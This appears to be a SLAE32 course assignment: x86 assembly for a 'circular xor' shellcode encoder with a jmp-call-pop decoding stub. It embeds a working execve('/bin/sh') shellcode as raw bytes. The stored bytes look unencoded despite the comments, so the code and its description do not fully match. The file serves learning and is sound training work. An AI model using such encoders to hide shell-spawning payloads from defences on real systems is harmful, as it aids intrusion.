; name    : circularxor-xor
; author  : Sandro "guly" Zaccarini SLAE-1037
; purpose : this code has been written for SLAE32 assignment 4
; license : CC-BY-NC-SA
; the encoder i choose is a "circular xor". given a starting value used for the first byte,
; every byte xores the one that preceeds.
; to avoid null bytes, because for example //bin/sh has two equals consecutive bytes
; that if xored will lead to 0x00, i choose to inc 0x1 every "previous byte",
; paying attention to don't have any null case (ex: 0x4142 will lead to null bytes).
;
; having 0x414345 and a starting value of 0x26 as example, we will have:
; 0x41^0x26 => 0x67
; (0x43+0x1)^0x41 => 0x05
; (0x45+0x1)^0x43 => 0x05
; my encoded shellcode will then be 0x670505
; decoding stub will xor the first byte with a known value to have the first right value
; then inc it to xor the second one, to have the right second back, and so on
;
; every shellcode will terminate with an added byte, that is the real last one inc 1 to have a 0x00 when xored.
; for example, a shellcode like 0x414345 will be writte in .data as 0x41434546
;
; please note that i don't need to make this code nullbyte proof because it will be runt just locally
; but i'm doing it 0x00 free as extra-mile

  global _start

  section .text

  exit:
xor eax,eax
mov al,0x1
int 0x80

  _start:

; place in bl our xor starting value
mov bl,0xa1
jmp short call_decoder

  decoder:
pop esi
; al will hold current right value
mov al, byte [esi]
; i need to copy it also to bh to have it ready for next xor
mov bh,al
; first al is hardcoded of course, now al will
xor al, bl ; first one is hardcoded

; make room for the shellcode, current one is like 0x1f so way more than enough to sub 0x3f
sub esp,0x3f
; move first byte to esp
mov [esp+ecx],al

  decode:
; copy current right to bl
mov bl,bh
; add 1 to bl because during xor i did this
inc bl
; go to next byte
inc esi
; and add 1 to ecx to write to right position in the stack
inc ecx
; al will hold current right value
mov al, byte [esi]
; i need to copy it also to bh to have it ready for next xor
mov bh,al
; xor current with previous+1
xor al, bl
; copy the right value on the right position in the stack
mov [esp+ecx],al

; because i placed two consecutive values here (actually prev+0x1), al will be 0x00 and because nobody touched edx, dl is 0x00 too
cmp al,dl
;call trap
je write_shellcode
jmp short decode

  call_decoder:
call decoder
plainShellcode: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0x31,0xc0,0xb0,0x01,0xcd,0x80
mlen equ $-plainShellcode

  write_shellcode:
nop
nop
xor eax,eax
xor ebx,ebx
xor edx,edx

mov ecx,esp
; write id
mov al, 0x4
; write to sdout
mov bl, 0x1
; shellcode len, hardcoded
;mov dl, 0x20
mov dl,mlen
; do it
int 0x80
; put in ecx 4 bytes of my shellcode

call exit

;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
